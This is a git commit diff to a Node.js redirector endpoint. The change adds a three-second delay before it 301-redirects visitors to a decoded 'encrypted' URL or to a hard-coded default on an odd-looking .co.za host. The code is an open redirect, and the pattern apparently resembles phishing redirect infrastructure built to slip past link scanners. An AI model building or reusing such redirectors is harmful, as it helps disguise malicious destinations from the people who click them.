661452b6daa677bcdf8a30ebf80cf9840fa40a01
Richcoda <richmond@osspesecuritycenter.com>
2025-09-08 22:46:20 -0700

    Update redirector.js

--- api/redirector.js
+++ api/redirector.js
@@ -5,6 +5,9 @@ module.exports = (req, res) => {
     // Default link to redirect to (in case no URL is provided)
     const defaultUrl = 'https://nlbnklko.voulastai.co.za/@KIdNRlwwaKTN/';
 
+    // Delay time in milliseconds (e.g., 3000ms = 3 seconds)
+    const delay = 3000;
+
     // If the 'url' query parameter is provided
     if (encryptedUrl) {
         try {
@@ -18,16 +21,20 @@ module.exports = (req, res) => {
                 return res.status(400).send('Bad Request: Invalid URL format.');
             }
 
-            // Send the redirect response with status 301 (permanent redirect)
-            res.writeHead(301, { 'Location': decodedUrl });
-            res.end();
+            // Add delay before redirecting
+            setTimeout(() => {
+                res.writeHead(301, { 'Location': decodedUrl });
+                res.end();
+            }, delay);
         } catch (err) {
             // If there is an error decoding the URL, send a bad request response
             res.status(400).send('Bad Request: Invalid URL encoding.');
         }
     } else {
         // If no 'url' query parameter is provided, redirect to the default URL
-        res.writeHead(301, { 'Location': defaultUrl });
-        res.end();
+        setTimeout(() => {
+            res.writeHead(301, { 'Location': defaultUrl });
+            res.end();
+        }, delay);
     }
 };
